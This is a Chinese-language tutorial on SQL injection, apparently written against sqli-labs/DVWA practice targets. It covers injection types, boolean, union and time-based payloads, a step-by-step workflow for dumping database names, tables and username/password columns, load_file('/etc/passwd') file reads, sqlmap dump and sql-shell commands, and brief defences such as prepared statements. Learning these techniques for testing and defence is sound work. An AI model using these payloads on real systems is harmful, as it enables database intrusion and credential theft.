# SQL注入分类

数字型:
select字段名from表名where id= 1;

```
http://www.sql.com/xxx.php?id=1
假设ID为存在注入的参数
http://www.sql.com/xxx.php?id=1'
语句报错
http://www.sq1.com/xxx.php?id=1 and 1=1
页面正常返回结果
http://www.sq1.com/xxx.php?id=1 and 1=2
页面返回错误
```

字符型:
select字段名from表名where id = 1;

```
http://www.sql.com/xxx.php?id=1
假设ID为存在注入的参数
http://www.sql.com/xxx.php?id=1'
语句报错
http://www.sql.com/xxx.php?id=1' and '1'='1页面正常返回结果
id ='$'
id ='1'
id ='1''
id = '1' and '1'='1'
http://www.sq1.com/xxx.php?id=1' and '1'='2 页面返回错误
```

在学习owasp相关文章时，发现他们通常将sql注入攻击分为三类:

- 带内注入: 使用与注入sql代码相同的通道提取数据(即使用web 正常功能检索数据，并且检索的数据直接显示在网页中)，比如常见的显错注入。
- 带外注入: 使用其他渠道检索数据(比如将检索的数据通过dns或者电子邮件传输)。
- 盲注(也有称为推理注入) : 没有实际的数据传输，但是通过特定请求可以观察到sql服务器的异常行为，以此来推理出结果，比如常见的延时注入和堆叠注入。

更普遍的一种分类方式是按照效果分类，共有7类，分别是:

- 布尔注入
- 联合注入
- 显错注入
- 延时注入
- 宽字节注入
- 带外注入
- 堆叠注入

# 利用场景

1.获取管理员用户或者其他用户的账户信息

2.利用数据库的漏洞进行提权

3.获取数据库里面的敏感信息

4.更改数据库里面的数据

# 漏洞危害

1.攻击者可以利用漏洞查询其他用户的用户凭据

2.攻击者可能控制数据库中的所有数据

3.提权安装后门木马

4.恶意操作，如清空数据库

# 检测方法

## 显错注入

```
SELECT first_name, last_name FROM users WHERE user_id = '1';
SELECT first_name, last_name FROM users WHERE user_id = '1'';
```

## 布尔注入

用来快速获取数据

```
SELECT first_name, last_name FROM users WHERE user_id = '1';
SELECT first_name, last_name FROM users WHERE user_id = '99' or 1=1 #'';
SELECT first_name, last_name FROM users WHERE user_id = '99' and 1=1 #'';
```

获取指定信息使用and,获取所有信息使用or

```
1' and ascii (substr (database(),4,1))>96 #真
1' and ascii (substr (database(),4,1))<97 #假
1' and ascii (substr (database(),4,1))<98 #真
ascii 97->a
dvwa

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #

1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #
users的16进制
显示存在，说明uers表有8个字段。

```

## 联合注入

union关键词

```
SELECT [colums_name] from [table_name] or UNION SELECT x, y, z-
基于union查询需要保持列数一致这个逻辑
```

输入payload:  'union select 1,2 --'   相当于执行语句  mysql> select user_name , user_password from user_information where user_id=' 'union select 1,2--'';

当应用程序容易受到 SQL 注入攻击并且查询结果在应用程序的响应中返回时，该`UNION`关键字可用于从数据库中的其他表中检索数据。这会导致 SQL 注入 UNION 攻击。

该`UNION`关键字允许您执行一个或多个附加`SELECT`查询并将结果附加到原始查询。例如：

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

此 SQL 查询将返回具有两列的单个结果集，其中包含来自 columns`a`和`b`in`table1`以及 columns`c`和`d`in `table2`的值。

要使`UNION`查询起作用，必须满足两个关键要求：

- 各个查询必须返回相同数量的列。
- 每列中的数据类型必须在各个查询之间兼容。

要进行 SQL 注入 UNION 攻击，您需要确保您的攻击满足这两个要求。这通常涉及弄清楚：

- 从原始查询返回了多少列？
- 从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果？



```
'union select load_file('/etc/passwd'),2 --  查看文件
```

```
1' union select 1,table_name from information_schema.tables where table_schema=database() #
查看所有表名
```

order字句查询列数

```
1' order by 1#
1' order by 2#
1' order by 3#
1' order by 4#
```

- 使用`NULL`作为注入`SELECT`查询返回值的原因是每列中的数据类型必须在原始查询和注入查询之间兼容。由于`NULL`可转换为每种常用数据类型，因此`NULL`在列数正确时使用可以最大限度地提高有效负载成功的机会。
- 在 Oracle 上，每个`SELECT`查询都必须使用`FROM`关键字并指定一个有效的表。Oracle 上有一个内置表`dual`，可用于此目的。所以注入的查询甲骨文将需要看起来像：`' UNION SELECT NULL FROM DUAL--`。
- 所描述的有效负载使用双破折号注释序列`--`来注释掉注入点之后的原始查询的其余部分。在 MySQL 上，双破折号序列后必须跟一个空格。或者，`#`可以使用散列字符来标识评论。

## 在单列中检索多个值

在前面的示例中，假设查询仅返回单个列。

通过将值连接在一起，您可以轻松地在此单列中检索多个值，最好包括一个合适的分隔符来区分组合值。例如，在 Oracle 上，您可以提交输入：

```
' UNION SELECT username || '~' || password FROM users--
```

这使用双管道序列`||`，它是 Oracle 上的字符串连接运算符。注入的查询将`username`和`password`字段的值连接在一起，由`~`字符分隔。

MySQL可以用CONCAT(username,'-->',password)



## 延时注入

```
1' and sleep(6) #
1' and if(length(database())>0,sleep(9),1) #   转圈圈
1' and if(length(database())>3,sleep(9),1) #   转圈圈
1' and if(length(database())>4,sleep(9),1) #   不转圈圈
```

id是 1' and if(length(database())>0,sleep(9),1) # 明显延迟，说明数据库名的长度为4个字符;

抓包改参数id为

```
1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(4),1) #
```

明显延迟，说明数据库中的第一个表名长度为9个字符;

抓包改参数id为

```
1' and if((select count(column_name) from information_schema.columns where table_name=0x7573657273)=8,sleep(5),1) #
```

明显延迟，说明uers表有8个字段。

# 完整的SQL注入攻击流程

1.判断是否能够注入

```
http://daishen.ltd:1112/Less-1/?id=1
```

2.判断表中存在几个字段

```
id=1' order by 4 --+

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

3.判断字段位置

```
id=1' and 1=2 union select 1,2,3 --+
```

4.爆所有库.

```
id=1' and 1=2 union select 1,database(),3 --+   查看当前库

id=1' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+

```

5.爆指定库的所有表

```
id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

oracle:
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

6.爆指定表的所有字段

```
id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+

oracle

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

7.爆出字段内容

```
id=1' and 1=2 union select 1,username,password from users where id=1 --+

id=1' and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

# 使用sqlmap进行自动化攻击

扫描URL目标

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1"
```

查看所有库

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -dbs
```

查看所有表

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security --tables
```

查看表字段

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security -T users --columns
```

查看表字段内容

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security -T users --columns -C "username,password" -dump
```

进入sql-shell

```
 sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --sql-shell
```

随机agent

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --random-agent
```

多线程

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --threads=4
```

导出HTTP详细请求

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -t http.log
```

带cookie注入

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --cookie="PHPSESSID=1b5arqpjub0o45b27e3s8ukf8c; security=low"
```

```
--mobile				有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆 
--level=LEVEL			执行测试的等级(1-5， 默认为1)
--risk=RISK				执行测试的风险(0-3, 默认为1)
--time-sec=TIMESEC		DBMS响应的延迟时间(默认为5秒)
-U USER					用来进行枚举的数据库用户
--sql-query=QUERY		要执行的SQL语句
--tamper				指定脚本
```

# SQL注入与防御

1.过滤（输入验证）：检测用户输入的合法性确保输入的内容是正常数据，数据校验最重要的就是在服务端校验

2.禁止回显错误报告：禁止回显错误信息，提高攻击难度

3.预编译输入：PDO (PHP Data Objects)采用预处理的方式，事先创建SQL语句模板，并发送到资料库，预处理，占位符